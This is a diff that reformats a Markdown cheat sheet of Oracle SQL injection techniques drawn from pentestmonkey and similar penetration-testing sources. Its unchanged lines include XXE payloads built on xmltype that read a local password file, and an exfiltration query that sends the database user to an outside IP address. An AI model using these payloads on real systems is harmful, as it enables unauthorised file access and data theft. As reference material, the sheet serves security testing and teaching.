@@ -1,12 +1,13 @@
 # SQLi - Oracle
 
-#### From:
+## From:
+
 - http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
 - http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/
 - http://www.securitytube.net/video/6138
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
  
-### Enumeration
+## Enumeration
 
 | Enumerate    | Command                 |
 |--------------|-------------------------|
@@ -21,32 +22,37 @@
  
 Dumping
 You can dump tables very similar to any other query language.
-```
+
+```sql
 SELECT * FROM <tablename>
 ```
  
-### Notes
-1. There is no LIMIT clause in Oracle. If the database is Oracle 12c R1 or above, use instead `FETCH NEXT 10 ROWS ONLY`
-e.g.
-```
+## Notes
+
+There is no LIMIT clause in Oracle. If the database is Oracle 12c R1 or above, use instead `FETCH NEXT 10 ROWS ONLY`, e.g.
+
+```sql
 SELECT * FROM APP_HISTORY  FETCH NEXT 100 ROWS ONLY
 ```
  
-### Local file access
+## Local file access
 
-```
+```sql
 select extractvalue(xmltype('<!ENTITY xxe SYSTEM "etc/passwd">]>'||'&'||'xxe;'),'/l') from dual;
 select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "etc/passwd"> %remote; %param1;]>'),'/l') from dual;
 ```
 
-### Data Exfiltration
+## Data Exfiltration
+
 https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/
 https://exploitstube.com/sql-injection-abusing-xxe-in-oracle.html
-```
+
+```sql
 select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://66.35.63.202/'||(SELECT user FROM dual)||'"> %remote; %param1;]>'),'/l') from dual;
 ```
 
-### Pentestmonkey - Oracle SQLi
+## Pentestmonkey - Oracle SQLi
+
 http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
  
 Some of the queries in the table below can only be run by an admin.  These are marked with “– priv” at the end of the query.
@@ -84,7 +90,8 @@ Some of the queries in the table below can only be run by an admin.  These are m
 | Location of DB files | `SELECT name FROM V$DATAFILE;`|
 | Default/System Databases | `SYSTEM`<br>`SYSAUX`
 
-### Misc Tips
+## Misc Tips
+
 In no particular order, here are some suggestions from pentestmonkey readers.
 From Christian Mehlmauer:
 | Enumerate    | Command                 |
